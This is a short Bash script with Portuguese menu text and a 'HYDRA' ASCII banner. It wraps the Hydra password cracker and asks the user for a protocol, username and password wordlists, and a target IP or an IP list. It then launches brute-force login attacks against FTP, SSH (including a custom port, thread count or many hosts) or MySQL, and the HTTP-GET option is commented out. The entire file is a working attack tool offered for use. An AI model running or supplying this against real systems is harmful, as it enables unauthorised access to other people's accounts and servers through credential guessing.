#!/bin/bash

echo "#     #  #       #   # #       #######      #            #        ####   "
echo "#     #    #   #     #   #     #     #     # #           #        #    # "
echo "#     #      #       #     #   #    #     #   #   #####  #        #    # "
echo "#######      #       #      #  #  #      #     #         #        # # #  "
echo "#     #      #       #     #   #   #    #########        #        #    # "
echo "#     #      #       #   #     #    #  #         #       #        #     #"
echo "#     #      #       # #       #     #            #      #######  #####  "
echo "                                                                         "
echo "                                                                         "
echo "                                                                         "
echo " ESCOLHA O PROTOCOLO PARA O ATAQUE BRUTE FORCE "
echo "                                         "
echo ""
echo ""
echo "1- FTP"
echo "2- SSH"
echo "3- SSH (COM ESCOLHA DE UMA PORTA EXPECIFICA)"
echo "4- SSH (COM NÚMERO DE THREADS ESPECIFICAS)"
echo "5- SSH (COM UMA LISTA DE IP's)"
echo "6- MYSQL"
echo "7- HTTP-GET"
echo " "

var_ftp=ftp
var_ssh=ssh
var_ssh2=ssh
var_ssh3=ssh
var_ssh4=ssh
var_mysql=mysql
var_httpget=http-get

read -e -p "Escolha uma opção: " var_protocolo
read -e -p "Nome do Usuário ou Wordlist: " var_nome
read -e -p "Wordlist de Senha: " var_arquivo

if [ "$var_protocolo" -eq 1 ] 
then
read -e -p "Informe o IP do Alvo: " var_ip
echo "VOCÊ ESCOLHEU A OPÇÃO FTP"
hydra -L $var_nome -P  $var_arquivo $var_ftp://$var_ip

elif [ "$var_protocolo" -eq 2 ] 
then
read -e -p "Informe o IP do Alvo: " var_ip
echo "VOCÊ ESCOLHEU A OPÇÃO SSH"
hydra -L $var_nome -P  $var_arquivo $var_ip $var_ssh

elif [ "$var_protocolo" -eq 3 ]
then
read -e -p "Informe o IP do Alvo: " var_ip
echo "VOCÊ ESCOLHEU A OPÇÃO SSH COM PORTA ESPECIFICA"
read -e -p "Número da Porta SSH: " var_porta
hydra -s $var_porta -l $var_nome -P $var_arquivo $var_ip $var_ssh2

elif [ "$var_protocolo" -eq 4 ]
then
read -e -p "Informe o IP do Alvo: " var_ip
echo "VOCÊ ESCOLHEU A OPÇÃO SSH COM NÚMERO DE THREADS ESPECIFICA"
read -e -p "Número de Threads: " var_threads
hydra -l $var_nome -P $var_arquivo $var_ip -t $var_threads $var_ssh3

elif [ "$var_protocolo" -eq 5 ]
then
echo "VOCÊ ESCOLHEU SSH COM UMA LISTA DE IP'S"
read -e -p "Informe a Lista de IP's: " var_list_ip
hydra -l $var_nome -P $var_arquivo -M $var_list_ip $var_ssh4

elif [ "$var_protocolo" -eq 6 ]
then
read -e -p "Informe o IP do Alvo: " var_ip
echo "VOCÊ ESCOLHEU A OPÇÃO MYSQL"
hydra $var_ip $var_mysql -l $var_nome -P $var_arquivo 
else

#elif [ "$var_protocolo" -eq 7 ]
#then
#read -e -p "Informe o IP do Alvo: " var_ip
#echo "VOCÊ ESCOLHEU A OPÇÃO HTTP-GET"
#hydra $var_ip $var_httpget -l $var_nome -P $var_arquivo 
#else
echo "Você não selecionou nehuma das opções validas!"
fi

